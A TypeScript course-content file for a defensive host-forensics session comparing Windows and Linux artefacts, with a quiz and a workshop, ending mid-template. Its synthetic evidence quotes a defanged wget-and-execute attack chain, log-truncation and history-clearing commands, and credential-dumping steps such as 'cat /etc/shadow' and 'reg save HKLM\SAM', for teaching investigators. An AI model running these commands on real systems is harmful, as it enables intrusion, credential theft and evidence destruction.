import type { Session } from '@/types/content'

const FILE = 'defensive_day_6_host_forensics_esl.md'

export const session06: Session = {
  number: 6,
  slug: 'host-forensics',
  title: 'Host Forensics: Windows and Linux',
  summary:
    'An attacker can delete the malware. They cannot easily delete every trace that it ran — on either operating system.',
  abstract:
    'Five questions apply to every compromised host, whatever it runs: what executed, what persisted, what was accessed, what privileges were gained, and what was deleted. This session teaches those five questions and then shows how Windows and Linux each answer them — Prefetch, shellbags, SRUM and the registry on one side; bash history, auditd, cron and authorized_keys on the other. The practical reconstructs a cross-platform intrusion from two hosts where the attacker cleaned up.',
  track: 'core',
  themes: ['Artefacts', 'Persistence', 'Anti-forensics'],
  prerequisites: [
    'Session 5 — acquisition, chain of custody and timeline construction',
    'Session 2 — Windows Event IDs and the Linux log file locations',
    'Comfort with basic shell commands: find, grep, stat, awk',
  ],
  outcomes: [
    'Apply the five host investigation questions in priority order on either operating system',
    'Prove that a program executed on Windows or Linux after the executable has been deleted',
    'Locate persistence across every mechanism class on both platforms, not just the first one found',
    'Reconstruct file and folder access on Windows from registry artefacts that survive deletion',
    'Verify tool integrity on a Linux host before trusting any output from it',
    'Treat a cleared or truncated log as a finding, and name what survives it',
  ],
  sourceFiles: [FILE],
  sourceNotes: [
    'The source file teaches Windows and Linux side by side rather than sequentially, on the argument that the questions are identical and only the evidence locations differ. This session keeps that structure — the comparison is the pedagogy, not a formatting choice.',
  ],

  theory: {
    minutes: 90,
    blocks: [
      {
        kind: 'title',
        id: 'open',
        title: 'Session 6',
        overline: 'Defensive Track · Session 06 of 10',
        lead:
          'You can remove your footprints from the carpet. You cannot remove the fact that the fibres were compressed.',
        provenance: 'source',
        sources: [{ file: FILE, section: '2. Introduction' }],
      },

      {
        kind: 'retrieval',
        id: 'retrieval',
        title: 'Recall from Session 5',
        minutes: 6,
        recallPrompt: 'From memory.',
        questions: [
          'What is captured first on a live compromised host, and what is lost if you reboot instead?',
          'What does a hash mismatch between acquisition and analysis mean, and what do you do?',
          'Why disable a compromised account rather than delete it?',
          'Why does a timeline built from many sources resist anti-forensic cleanup?',
        ],
        answers: [
          'Memory. A reboot destroys running processes, injected code with no file on disk, active connections, cached credentials and any encryption keys.',
          'The evidence is not intact. Stop, document the discrepancy, escalate, and do not proceed with analysis.',
          'Disabling preserves the account\'s audit history, which is itself evidence. Both stop access; only one keeps the record.',
          'Because an attacker who clears one source cannot simultaneously clear all of them — and anything already forwarded off the host is beyond their reach entirely.',
        ],
        provenance: 'supplementary',
      },

      {
        kind: 'scenario',
        id: 'scenario',
        title: 'Opening scenario: two machines, both cleaned',
        minutes: 4,
        synthetic: true,
        setting: 'A cloud-hosted Linux web server and a Windows finance workstation, three days apart.',
        narrative: [
          'The Linux server began making outbound connections to an unknown address at 03:00 and its CPU spiked. Three days later a Windows finance workstation was reported as behaving strangely, and its EDR agent was found disabled.',
          'You have a disk image and a memory capture from each. On both, the malware has been deleted. On both, logs have been tampered with. On the Windows host, the security agent was turned off before most of the activity.',
          'The two incidents are suspected to be one intrusion. Nothing available to you says so.',
        ],
        drivingQuestion:
          'With the tools deleted and the logs cleared on both hosts, what evidence still exists — and what single artefact would link the two machines?',
        provenance: 'source',
        sources: [{ file: FILE, section: '7. Scenario Walkthrough: Cross-Platform Compromise Reconstruction' }],
      },

      {
        kind: 'objectives',
        id: 'objectives',
        title: 'What you will be able to do',
        minutes: 3,
        provenance: 'supplementary',
        objectives: [
          { verb: 'Apply', text: 'the five host investigation questions in priority order on either platform' },
          { verb: 'Prove', text: 'execution after the executable has been deleted' },
          { verb: 'Locate', text: 'persistence across every mechanism class, not just the first found' },
          { verb: 'Reconstruct', text: 'file access from artefacts that survive deletion' },
          { verb: 'Verify', text: 'tool integrity before trusting live output on Linux' },
          { verb: 'Treat', text: 'log tampering as a finding, and name what survives it' },
        ],
      },

      {
        kind: 'concept',
        id: 'five-questions',
        title: 'Five questions, two operating systems, one method',
        minutes: 7,
        lead:
          'Before any platform-specific artefact, every host investigation asks the same five things in roughly this order of priority.',
        points: [
          'What ran? Prove execution even if the file was deleted afterwards.',
          'What stayed active? Find how the attacker survives a reboot, a logoff, or a killed process.',
          'What was accessed? Which files, folders and credentials were touched.',
          'What privileges were gained, and where did they move? Escalation and lateral movement.',
          'What was deleted or hidden? Cleared logs, wiped history, replaced binaries — and what survived.',
        ],
        callout: {
          tone: 'rule',
          text: 'Before closing any finding, ask: what is the second, independent artefact that confirms this? Multi-source corroboration is both more convincing and more resistant to anti-forensic disruption than any single artefact.',
        },
        redView:
          'A complete cleanup across every independent artefact location, without leaving evidence of the cleanup itself, is extremely difficult under operational pressure. The specific artefacts differ between platforms; the structural problem is identical on both.',
        blueView:
          'The questions are the method. An investigator who knows the five questions can work a platform they are less familiar with, because the only thing that changes is where to look — which is a lookup, not a skill.',
        provenance: 'source',
        sources: [{ file: FILE, section: '4.1 Shared Investigation Methodology' }],
      },

      {
        kind: 'compare',
        id: 'execution',
        title: 'Question 1 — what ran?',
        minutes: 10,
        lead:
          'Proving that a program executed, even one deleted afterwards, is usually the first concrete win in an investigation.',
        columns: [
          { label: 'Windows', glyph: '▣' },
          { label: 'Linux', glyph: '▤' },
        ],
        rows: [
          {
            label: 'Primary artefact',
            cells: [
              'Prefetch (C:\\Windows\\Prefetch\\) — executable name, full run path, run count, up to 8 run timestamps, and the files it accessed',
              'Bash history (~/.bash_history, /root/.bash_history) and auditd execve records',
            ],
          },
          {
            label: 'Survives deletion of the tool?',
            cells: [
              'Yes. Deleting the executable does not delete its Prefetch entry.',
              'Partially. history -c or unset HISTFILE suppress shell history; auditd records execve independently of the shell.',
            ],
          },
          {
            label: 'Secondary corroboration',
            cells: [
              'UserAssist in NTUSER.DAT — GUI program execution, ROT13 encoded',
              'syslog and cron execution entries; /proc/<pid>/environ on a live system',
            ],
          },
          {
            label: 'Why it is powerful',
            cells: [
              'The filename hash ties execution to the exact path used — MALWARE.EXE-AB12CD34.pf. A legitimate tool running at an unusual time is itself a finding.',
              'An unexpectedly empty .bash_history with a recent modification time is evidence. unset HISTFILE may still appear in a previous session\'s history.',
            ],
          },
          { label: 'Parsing tool', cells: ['PECmd (Eric Zimmerman) — CSV output for timeline integration', 'cat and stat on history files; ausearch for auditd'] },
        ],
        provenance: 'source',
        sources: [{ file: FILE, section: '4.2 Execution Evidence: Windows vs Linux' }],
        detail: [
          'Prefetch is the artefact most often overlooked by less experienced attackers, and it is the fastest high-value check in a Windows investigation — PECmd parses the whole directory in under a minute. Deleting the malware does not delete the record of it running.',
          'On Linux, auditd configured for execve syscalls is the forensic-grade alternative to bash history, because it keeps working when the attacker disables shell history entirely. If auditd is not deployed, that is a finding about the environment to raise, not just a gap in this investigation.',
        ],
      },

      {
        kind: 'compare',
        id: 'persistence',
        title: 'Question 2 — what stayed active?',
        minutes: 10,
        lead:
          'Both platforms offer several built-in persistence mechanisms that blend with legitimate system activity. Finding one and stopping is the most common investigative failure.',
        columns: [
          { label: 'Windows', glyph: '▣' },
          { label: 'Linux', glyph: '▤' },
        ],
        rows: [
          {
            label: 'Scheduled execution',
            cells: [
              'Scheduled Tasks in C:\\Windows\\System32\\Tasks\\; registry TaskCache; Event IDs 4698 created, 4702 updated, 4699 deleted',
              'Cron in /etc/crontab, /etc/cron.d/, /var/spool/cron/crontabs/<user>. Execution traces remain in syslog even after the crontab entry is deleted.',
            ],
          },
          {
            label: 'Auto-start',
            cells: [
              'Registry Run and RunOnce keys (HKLM and HKCU); the Startup folder',
              'systemd services in /etc/systemd/system/ with Restart=always; user-level services in ~/.config/systemd/user/ which need no root',
            ],
          },
          {
            label: 'Service-based',
            cells: ['New service install triggers Event ID 7045; check HKLM\\SYSTEM\\CurrentControlSet\\Services', 'A malicious .service unit pointing at /tmp/ or similar'] },
          {
            label: 'Credential-based',
            cells: [
              'Not applicable in the same form',
              'SSH authorized_keys. A single added public key survives a password reset entirely, because key authentication is independent of password authentication.',
            ],
          },
          {
            label: 'Red flags',
            cells: [
              'Names mimicking legitimate processes; paths in %TEMP%, %APPDATA% or Public; creation outside deployment windows',
              'Paths in /tmp/, /dev/shm/ or hidden dot-directories; base64-decoded commands; generic "maintenance" names',
            ],
          },
          {
            label: 'Less examined',
            cells: [
              'WMI event subscriptions — fileless, Event IDs 5857–5861; AppInit_DLLs; Image File Execution Options',
              'User-level systemd services needing no root; /dev/shm/ staging, which lives in RAM and clears on reboot',
            ],
          },
          {
            label: 'Audit approach',
            cells: [
              'Autoruns (Sysinternals) shows every startup location in one view. The single most efficient Windows persistence audit.',
              'No single equivalent. Run find / -name authorized_keys -newer /etc/passwd, crontab -l for every user, and find /etc/systemd/system/ -newer /etc/passwd as a fixed checklist.',
            ],
          },
        ],
        provenance: 'source',
        sources: [{ file: FILE, section: '4.3 Persistence Mechanisms: Windows vs Linux' }],
        detail: [
          'SSH key persistence deserves particular attention because it defeats the most common containment reflex. Resetting passwords is usually the first thing an incident responder does to an account. A key added to authorized_keys is completely unaffected by it, and most defenders do not check.',
          'On Windows, more careful operators prefer WMI event subscriptions precisely because investigators check them less often and because they leave no file on disk. If your persistence audit stops at scheduled tasks and Run keys, that preference is rational.',
        ],
      },

      {
        kind: 'compare',
        id: 'access',
        title: 'Questions 3 and 4 — what was accessed, and where did they go?',
        minutes: 10,
        lead:
          'Reconstructing what an attacker looked at or copied is central to data theft and insider threat investigations — and some of the strongest Windows evidence survives deletion of the thing itself.',
        columns: [
          { label: 'Windows', glyph: '▣' },
          { label: 'Linux', glyph: '▤' },
        ],
        rows: [
          {
            label: 'Folder access after deletion',
            cells: [
              'Shellbags (USRCLASS.DAT) record that a user opened a folder, and persist after the folder is deleted. RecentDocs and LNK files record full original paths and timestamps.',
              'No direct equivalent. Bash history records the commands that touched files; auditd records file access events.',
            ],
          },
          {
            label: 'Data volume and exfiltration timing',
            cells: [
              'SRUM (SRUDB.dat) records per-application network bytes for the last 30 days. Often the only exfiltration evidence when network logs are incomplete.',
              'auditd network logging; correlate file sizes and timestamps against scp or curl commands in history.',
            ],
          },
          {
            label: 'Lateral movement linkage',
            cells: [
              'Event ID 4648 at the source paired with Event ID 4624 Type 10 at the destination. RDP target history in the registry.',
              '~/.ssh/known_hosts lists every machine connected to over SSH. Accepted publickey entries in the destination\'s auth log.',
            ],
          },
          {
            label: 'Credential access indicator',
            cells: [
              'Sysmon Event ID 10 — a process opening a handle to lsass.exe. Event ID 4656. Prefetch for the dumping tool persists after deletion.',
              'Bash history showing cat /etc/shadow; an auditd file-access event on /etc/shadow.',
            ],
          },
          {
            label: 'Privilege escalation path',
            cells: [
              'SAM database dumping (reg save HKLM\\SAM); NTDS.DIT or DCSync for domain credentials, Event ID 4662 on a non-DC',
              'SUID/SGID binaries — find / -perm -4000 -type f, cross-referenced with GTFOBins. A second UID 0 account: awk -F: \'$3==0\' /etc/passwd.',
            ],
          },
        ],
        provenance: 'source',
        sources: [
          { file: FILE, section: '4.4 Credential Access & Privilege Escalation: Windows vs Linux' },
          { file: FILE, section: '4.5 File & User Activity Access: Windows vs Linux' },
        ],
        detail: [
          'Shellbags are the artefact that most surprises people. They record that a user navigated into a folder, and they persist in the registry after the folder itself is gone. In an insider threat case, shellbags plus RecentDocs plus LNK files give three independent sources for the same access — far harder to challenge than any one.',
          'SRUM is the counterpart for volume. It records how many bytes each application transferred over thirty days, which means that once an exfiltration is in the SRUM record, the volume is difficult to deny even if the network logs are incomplete.',
          'On Linux, known_hosts is the single artefact most likely to link two machines. It lists every host the user connected to over SSH, and an attacker focused on deleting the files they copied frequently does not think to clear it.',
        ],
      },

      {
        kind: 'concept',
        id: 'antiforensics',
        title: 'Question 5 — a cleared log is a finding, not a dead end',
        minutes: 11,
        lead:
          'Log tampering removes the local record. It does not remove the other records, and the tampering itself usually leaves a trace.',
        points: [
          'Windows: clearing the Security log generates Event ID 1102. Clearing the System log generates 104. The clearing announces itself.',
          'Linux: truncate -s 0 /var/log/auth.log empties the file silently. There is no clearing event — only a suspicious modification timestamp.',
          'What survives on both: anything already forwarded to a SIEM before the clear.',
          'What survives on Windows: Prefetch, registry artefacts, file metadata.',
          'What survives on Linux: cron execution history in syslog, even after the crontab entry is deleted.',
          'On Linux specifically: verify binary integrity with rpm -Va or debsums -c before trusting any live output at all.',
        ],
        callout: {
          tone: 'warn',
          text: 'A rootkitted ps, netstat or ls does not stay silent — it actively lies. If rpm -Va returns a hash mismatch (flag 5) on a system binary, you cannot trust any local tool output until you mount the filesystem read-only on a known-clean workstation or boot from trusted external media.',
        },
        redView:
          'Clearing an entire Windows Security log is highly visible. Deleting individual records selectively is much harder and much rarer. On Linux, truncation is quieter — no clearing event at all — which makes Linux log tampering easier to get away with than its Windows equivalent.',
        blueView:
          'Centralised log forwarding, configured before an incident, is the single most important forensic infrastructure decision on either platform. It is the only defence against local cleanup that works regardless of how the cleanup is performed.',
        provenance: 'source',
        sources: [{ file: FILE, section: '4.6 Log Analysis, Integrity Verification & Anti-Forensics' }],
        detail: [
          'Chainsaw and Hayabusa apply Sigma rules directly to raw .evtx files and return prioritised findings in minutes. For high-volume Windows triage across many hosts, they turn a day of manual event log review into a short prioritised list — and they connect this session directly back to the Sigma rules written in Session 4.',
          'On Linux, AIDE provides baseline file integrity monitoring and auditd provides kernel-level visibility that does not depend on any single log file. Both must be deployed before the incident to be useful during it.',
        ],
      },

      {
        kind: 'evidence',
        id: 'demo',
        title: 'Instructor demonstration: what survived the cleanup',
        minutes: 19,
        synthetic: true,
        lead:
          'Triage output from the two hosts in the opening scenario, after the attacker cleaned up. Select each line.',
        caption: 'Synthetic forensic triage output, Linux web server and Windows workstation',
        source: 'Fabricated for teaching. Command syntax and artefact names follow the real tools.',
        lines: [
          {
            text: '[LINUX] $ rpm -Va  →  S.5....T.  /usr/bin/ps    S.5....T.  /usr/bin/netstat',
            note: {
              kind: 'confirmed',
              label: 'Run this first — everything after it depends on the answer',
              body: 'Flag 5 is a hash mismatch: these binaries differ from what the package manager installed. Both ps and netstat have been replaced. Every process listing and every connection listing from this host is now untrustworthy — not incomplete, actively false. This is why integrity verification is the first Linux step, not a later one.',
            },
          },
          {
            text: '[LINUX] $ stat /root/.bash_history  →  Size: 2847   Modify: 2026-03-11 03:22:14',
            note: {
              kind: 'observation',
              label: 'Not empty — and the timestamp is the finding',
              body: 'The attacker ran history -c, which clears the current session\'s in-memory history. The file on disk retains earlier sessions. Note the modification time: 03:22, which is inside the intrusion window and outside any normal administrative activity on this host.',
            },
          },
          {
            text: '[LINUX] $ cat /root/.bash_history  →  wget hxxp://185.220.101.45/agent.sh ; chmod +x agent.sh ; ./agent.sh ; crontab -e ; history -c',
            note: {
              kind: 'confirmed',
              label: 'The whole chain, written down by the attacker',
              body: 'Download, make executable, run, edit crontab, clear history. The final command is in the file it was meant to empty, because it cleared the session rather than the file. Note that the address is defanged here — written hxxp — which is standard practice in reports so nobody accidentally clicks it.',
            },
          },
          {
            text: '[LINUX] $ crontab -u root -l  →  */5 * * * * /tmp/.sys/beacon.sh',
            note: {
              kind: 'confirmed',
              label: 'Persistence, with three tells',
              body: 'Every five minutes, from /tmp, in a hidden directory. The path is world-writable, the leading dot hides it from an ordinary ls, and a five-minute interval is a beacon schedule rather than a maintenance job. You will meet that interval again in Session 7 from the network side.',
            },
          },
          {
            text: '[LINUX] $ cat /root/.ssh/known_hosts  →  10.0.0.44 ssh-ed25519 AAAAC3Nza...',
            note: {
              kind: 'confirmed',
              label: 'The artefact that links the two machines',
              body: 'This is the answer to the scenario\'s driving question. The internal address of the Windows finance workstation appears in the SSH known_hosts file of the Linux server, which means someone connected from here to there. The attacker deleted their tools and cleared their history and did not think about this file.',
            },
          },
          {
            text: '[WINDOWS] > PECmd.exe -d C:\\Windows\\Prefetch  →  MIMIKATZ.EXE-3BA912C2.pf   run count: 2   last run: 2026-03-11 04:17',
            note: {
              kind: 'confirmed',
              label: 'Execution proved, with the file gone',
              body: 'The executable no longer exists on disk. Prefetch records that it ran twice, when, and from which path — the filename hash encodes the path, so this ties execution to a specific location. Deleting the tool did nothing to this record.',
            },
          },
          {
            text: '[WINDOWS] > Autoruns  →  Task "WindowsDefenderHealth" → C:\\Users\\Public\\svchost32.exe',
            note: {
              kind: 'confirmed',
              label: 'Persistence, same two tells as Session 2',
              body: 'A name borrowed from a security product, a binary named after a real Windows process, and a path no legitimate installer uses. Autoruns shows every startup location at once, which is why it is the first Windows persistence check rather than inspecting the task list by hand.',
            },
          },
          {
            text: '[WINDOWS] > RegRipper (USRCLASS.DAT)  →  shellbag: C:\\Users\\CFO\\Documents\\Q1_Financial_Reports\\',
            note: {
              kind: 'hypothesis',
              label: 'Proves navigation — and be precise about what that means',
              body: 'A shellbag records that this folder was opened in Explorer. It does not record that anything was copied out of it. The distinction matters enormously in a report: "the attacker browsed the CFO\'s financial reports folder" is supportable; "the attacker stole the CFO\'s financial reports" is not, from this artefact alone. SRUM is where you go for the volume question.',
            },
          },
          {
            text: '[WINDOWS] > SRUM Explorer  →  robocopy.exe   bytes sent: 2,471,829,504   window: 02:40–04:55',
            note: {
              kind: 'confirmed',
              label: 'Now you can say it',
              body: '2.3 GB sent by a file-copy utility during the intrusion window. Combined with the shellbag, you now have navigation to the folder and a volume transferred by a copying tool in the same window — two independent artefacts supporting the exfiltration finding. Neither alone would have carried it.',
            },
          },
          {
            text: '[WINDOWS] > Event log  →  1102: Security log cleared at 04:58, user: jsmith',
            note: {
              kind: 'observation',
              label: 'The cleanup announced itself',
              body: 'Windows generates Event ID 1102 when the Security log is cleared, so the act of hiding is itself recorded. More importantly, Events 4648 and 4104 from earlier in the session were already forwarded to the SIEM before 04:58 and are unaffected. The local record is gone; the evidence is not.',
            },
          },
        ],
        proves: [
          'System binaries on the Linux host were replaced, so no live tool output from it can be trusted',
          'The Linux host was compromised via a downloaded script, with cron persistence at five-minute intervals',
          'An SSH connection was made from the Linux host to the Windows workstation at 10.0.0.44',
          'Mimikatz executed twice on the Windows host despite having been deleted',
          'The CFO financial reports folder was navigated, and 2.3 GB was transferred by robocopy in the same window',
          'The Windows Security log was cleared at 04:58, after the activity it would have recorded',
        ],
        doesNotProve: [
          'That the files browsed in the shellbag are the same files counted in the SRUM volume — these are two artefacts supporting one hypothesis, which is strong but is not identity',
          'What credentials Mimikatz actually obtained; execution is proved, output is not',
          'That the Linux host was the initial point of entry rather than an intermediate hop',
          'That nothing else was taken. Absence of evidence for other folders is not evidence of absence, particularly after a log clear.',
        ],
        provenance: 'source',
        sources: [{ file: FILE, section: '7. Scenario Walkthrough: Cross-Platform Compromise Reconstruction' }],
        detail: [
          'The shellbag-versus-SRUM distinction is the most important analytical point in this session. Students consistently write "the attacker stole the CFO\'s files" from the shellbag alone. Browsing and copying are different acts with different evidence, and a report that conflates them is a report that falls apart when someone competent reads it.',
          'Note the defanging convention — hxxp rather than http. Use it for every address and domain in every report you write. It costs nothing and it prevents an accidental click by a reader who is skimming.',
        ],
      },

      {
        kind: 'check',
        id: 'check',
        title: 'Knowledge check',
        minutes: 6,
        provenance: 'supplementary',
        questions: [
          {
            id: 'q1',
            stem: 'You are triaging a live Linux host you suspect is compromised. What is your first command?',
            options: [
              {
                text: 'rpm -Va or debsums -c, to verify that the system binaries have not been replaced',
                correct: true,
                feedback:
                  'Correct. Until you know whether ps, netstat and ls are genuine, every other command\'s output is unverifiable. A rootkitted binary does not fail silently — it returns plausible, false information.',
              },
              {
                text: 'ps aux, to see what is currently running',
                correct: false,
                feedback:
                  'A reasonable instinct and the wrong order. If ps has been replaced, it will helpfully omit the attacker\'s process and you will record a clean result.',
              },
              {
                text: 'cat /var/log/auth.log, to find the initial access',
                correct: false,
                feedback:
                  'Valuable, and second. It also may have been truncated — and on Linux, unlike Windows, that leaves no clearing event.',
              },
              {
                text: 'netstat -antp, to find active connections',
                correct: false,
                feedback: 'Same problem as ps. netstat is one of the most commonly replaced binaries for exactly this reason.',
              },
            ],
          },
          {
            id: 'q2',
            stem: 'An attacker resets nothing, but your incident response resets every password in the environment. On a Linux host, what persistence survives?',
            options: [
              {
                text: 'A public key added to authorized_keys, because key authentication is independent of passwords',
                correct: true,
                feedback:
                  'Correct, and this surprises most responders. Password reset is usually the first containment action and it has no effect here. Check authorized_keys as a standard early step: find / -name authorized_keys -newer /etc/passwd.',
              },
              {
                text: 'Bash history entries',
                correct: false,
                feedback: 'History is a record, not a persistence mechanism. It grants no access.',
              },
              {
                text: 'A cron job, because cron does not authenticate',
                correct: false,
                feedback:
                  'Cron does survive a password reset — but it is usually found, because checking crontabs is a standard step. The authorized_keys entry is the one that is routinely missed.',
              },
              {
                text: 'Nothing. A full password reset removes all persistence.',
                correct: false,
                feedback:
                  'Password reset addresses credential-based access only. Scheduled execution, services and key-based authentication are all unaffected.',
              },
            ],
          },
          {
            id: 'q3',
            stem: 'A Windows shellbag shows the attacker opened a folder of financial reports. What can you write in your report?',
            options: [
              {
                text: 'That the folder was navigated to — and you need a separate artefact to say anything about copying',
                correct: true,
                feedback:
                  'Correct. A shellbag records navigation. SRUM gives transfer volume by application; LNK files and RecentDocs give specific files opened. Each answers a different question and the report must not blur them.',
              },
              {
                text: 'That the attacker exfiltrated the contents of the folder',
                correct: false,
                feedback:
                  'Not supported by this artefact. This is the specific overreach the demonstration was built to prevent.',
              },
              {
                text: 'That the attacker opened every file in the folder',
                correct: false,
                feedback: 'Shellbags record the folder, not its contents. RecentDocs and LNK files would speak to individual files.',
              },
              {
                text: 'Nothing, because shellbags are unreliable',
                correct: false,
                feedback:
                  'Shellbags are solid evidence for what they record. The discipline is stating precisely what that is, not discarding it.',
              },
            ],
          },
        ],
      },

      {
        kind: 'recap',
        id: 'theory-recap',
        title: 'Before the practical',
        minutes: 4,
        provenance: 'source',
        sources: [{ file: FILE, section: '12. Actionable Takeaways' }],
        takeaways: [
          'Execution evidence survives deletion on both platforms. Check it first — Prefetch on Windows, auditd and history on Linux.',
          'Persistence that "should not" survive often does. authorized_keys survives a password reset; shellbags survive folder deletion.',
          'A cleared log is a finding. Name what survives it, and say so in the report.',
          'On Linux, verify binary integrity before trusting any live output.',
          'Correlate lateral movement across both ends — 4648 with 4624 Type 10, or known_hosts with Accepted publickey.',
        ],
        furtherStudy: [
          { label: 'Eric Zimmerman\'s forensic tools', note: 'PECmd, EvtxECmd, Registry Explorer, SRUM tooling. The standard Windows artefact parsers.', href: 'https://ericzimmerman.github.io/' },
          { label: 'Hayabusa', note: 'Applies Sigma rules to raw .evtx files and returns prioritised findings. Connects Session 4 to this one.', href: 'https://github.com/Yamato-Security/hayabusa' },
          { label: 'GTFOBins', note: 'The reference for which Linux binaries can be abused for privilege escalation when SUID.', href: 'https://gtfobins.github.io/' },
          { label: 'Linux auditd documentation', note: 'How to configure execve auditing before you need it.', href: 'https://man7.org/linux/man-pages/man8/auditd.8.html' },
        ],
      },
    ],
  },

  practical: {
    minutes: 90,
    title: 'Workshop: Cross-platform reconstruction',
    blocks: [
      {
        kind: 'brief',
        id: 'brief',
        title: 'Briefing',
        minutes: 10,
        synthetic: true,
        resourceDir: 'host-forensics',
        scenario:
          'Two hosts, suspected to be one intrusion. Linux web server, Windows finance workstation. The attacker deleted their tools, cleared logs on both, and disabled the EDR agent on the Windows host. Reconstruct the full cross-platform timeline and prove the link between the machines.',
        objectives: [
          'Determine initial access on the Linux host and prove it from more than one artefact',
          'Find every persistence mechanism on both hosts, not only the first',
          'Prove execution on Windows for tools that no longer exist on disk',
          'Establish the pivot path between the two machines with a named artefact',
          'Distinguish file navigation from file transfer in your findings, and support each separately',
          'Produce one cross-platform timeline and a finding in the standard report format',
        ],
        requires: [
          { item: 'The cross-platform artefact pack (downloadable)', note: 'Parsed artefact output from both hosts: Prefetch, registry, SRUM, event logs, auth.log, bash history, crontabs, known_hosts, integrity check results.', file: '00-artefact-pack.md' },
          { item: 'The cross-platform timeline template (downloadable)', note: 'Columns: time, host, artefact, what it proves, ATT&CK ID, confidence.', file: '01-timeline-template.md' },
          { item: 'A text editor with search', note: 'The pack is parsed output, not raw images. No forensic tooling required.' },
          { item: 'A browser', note: 'For attack.mitre.org.' },
        ],
        setup: [
          'Download the artefact pack and the timeline template.',
          'Create a working folder named xplatform-<your-name>.',
          'Read the integrity check results for the Linux host before you read anything else from that host. Which of its artefacts you can trust depends on the answer.',
          'Work both hosts in parallel rather than finishing one first. The link between them is easier to see that way, and finding it early reframes everything else.',
        ],
        realism:
          'You are given parsed artefact output, not disk images. Running PECmd, RegRipper and SRUM Explorer against a real image is a worthwhile exercise and it is a tooling exercise — the pack states which tool produced each section and the recap links all of them. What is assessed here is artefact interpretation and cross-host correlation, which is the part that does not come from reading a tool\'s manual.',
        provenance: 'source',
        sources: [{ file: FILE, section: '9. Tools / Workflow — Host Forensic Investigation Workflow' }],
      },

      {
        kind: 'tasks',
        id: 'tasks',
        title: 'Your tasks',
        minutes: 55,
        lead: 'Work both hosts in parallel. The artefact that links them appears early on one of the two.',
        tasks: [
          {
            ref: 'T1',
            minutes: 10,
            title: 'Linux: integrity, then initial access',
            steps: [
              'Read the integrity check output. Record which binaries are untrustworthy and what that means for the rest of the Linux evidence.',
              'Find the initial access method in auth.log. Record the source address and the pattern that establishes it.',
              'Check whether auth.log shows signs of truncation — compare its modification time against the events it contains.',
              'Record what you can and cannot trust from this host, explicitly.',
            ],
            produces: 'An integrity assessment and the initial access finding with its supporting evidence.',
          },
          {
            ref: 'T2',
            minutes: 12,
            title: 'Linux: execution, persistence, pivot',
            steps: [
              'Read the bash history. Record the full command sequence and note what the attacker attempted to hide.',
              'Check every persistence location: crontabs for all users, systemd units, and authorized_keys.',
              'Check known_hosts. This is where the pivot path appears.',
              'Record each finding with its artefact source.',
            ],
            produces: 'The Linux execution chain, every persistence mechanism found, and the pivot artefact.',
          },
          {
            ref: 'T3',
            minutes: 15,
            title: 'Windows: execution, persistence, access',
            steps: [
              'Parse the Prefetch output. Record every tool that executed, including those no longer on disk.',
              'Read the Autoruns output and record every persistence mechanism. Check more than one class.',
              'Read the shellbag and RecentDocs output. Record what was navigated and what was opened.',
              'Read the SRUM output. Record transfer volumes by application and the window they occurred in.',
              'Keep navigation and transfer findings separate. You will need them separate for the report.',
            ],
            produces: 'The Windows execution list, persistence inventory, and separate navigation and transfer findings.',
          },
          {
            ref: 'T4',
            minutes: 10,
            title: 'Correlate and build the cross-platform timeline',
            steps: [
              'Merge both hosts into one chronological timeline.',
              'Place the pivot event so the sequence reads correctly across hosts.',
              'Label each entry: observation, hypothesis or confirmed. Confirmed needs two independent artefacts.',
              'Mark every point of anti-forensic activity and note what survived each one.',
              'Map each confirmed step to an ATT&CK technique.',
            ],
            produces: 'One cross-platform timeline, classified and mapped.',
          },
          {
            ref: 'T5',
            minutes: 8,
            title: 'Write the finding',
            steps: [
              'Write one finding in the Finding / Severity / Impact / Evidence / Remediation format.',
              'In Evidence, cite the artefact for every claim. A claim with no artefact does not belong in it.',
              'Be precise about the data question: what was navigated, what volume moved, and whether those are the same files.',
              'In Remediation, include the two containment steps this investigation shows are commonly missed.',
            ],
            produces: 'One complete finding in the standard format.',
          },
        ],
        provenance: 'source',
        sources: [{ file: FILE, section: '9. Tools / Workflow — Host Forensic Investigation Workflow' }],
      },

      {
        kind: 'hints',
        id: 'hints',
        title: 'Progressive hints',
        hints: [
          {
            forTask: 'T1',
            tiers: [
              'A flag containing 5 in rpm -Va output is a hash mismatch — the file differs from what was installed.',
              'For initial access, count the failed entries before the accepted one. The ratio tells you brute force rather than a stolen credential.',
              'For truncation: if auth.log\'s earliest entry is later than the host\'s uptime suggests it should be, something removed the earlier entries.',
            ],
          },
          {
            forTask: 'T2',
            tiers: [
              'Read the history file even though the attacker ran history -c. That command clears the session, not necessarily the file.',
              'Persistence: check crontabs, systemd units and authorized_keys. There is more than one mechanism in this pack.',
              'The pivot is a file listing machines connected to over SSH. Compare what is in it against the Windows host\'s address.',
            ],
          },
          {
            forTask: 'T3',
            tiers: [
              'Prefetch filenames encode the path as a hash suffix. Two entries for the same executable name with different hashes mean two different paths.',
              'Autoruns groups persistence by location. Read every group, not just Scheduled Tasks.',
              'For the data question: shellbags answer "where did they go", SRUM answers "how much moved". Record them in different rows of your timeline.',
            ],
          },
          {
            forTask: 'T4',
            tiers: [
              'Sort everything by timestamp first, with the host as a column, before interpreting anything.',
              'The pivot event should appear in the Linux evidence and have a corresponding authentication event on the Windows side. Find both.',
              'For "what survived": for each anti-forensic act, list the artefacts it did not touch. That list is the strongest paragraph in your report.',
            ],
          },
          {
            forTask: 'T5',
            tiers: [
              'Impact should state what the attacker could do with what they obtained, not only what they did.',
              'On precision: "2.3 GB was transferred by robocopy during the window in which the CFO reports folder was navigated" is defensible. Anything stronger is not.',
              'The two commonly missed containment steps: check authorized_keys on every Linux host the credential could reach, and check more than one persistence class on Windows.',
            ],
          },
        ],
        provenance: 'supplementary',
      },

      {
        kind: 'deliverables',
        id: 'deliverables',
        title: 'Organise your evidence and submit',
        minutes: 15,
        items: [
          { ref: 'D1', text: 'Linux integrity assessment stating what can and cannot be trusted', required: true },
          { ref: 'D2', text: 'Per-host artefact findings, each with its source named', required: true },
          { ref: 'D3', text: 'Complete persistence inventory for both hosts, covering more than one mechanism class each', required: true },
          { ref: 'D4', text: 'The pivot artefact and the corresponding evidence on the destination host', required: true },
          { ref: 'D5', text: 'One cross-platform timeline, classified and ATT&CK-mapped', required: true },
          { ref: 'D6', text: 'One finding in the standard format, with every claim cited to an artefact', required: true },
        ],
        structure: `xplatform-<your-name>/
  00-linux-integrity.md   → T1: what can be trusted
  01-linux-findings.md    → T1+T2: access, execution, persistence, pivot
  02-windows-findings.md  → T3: execution, persistence, navigation, transfer
  03-timeline.md          → T4: the merged cross-platform timeline
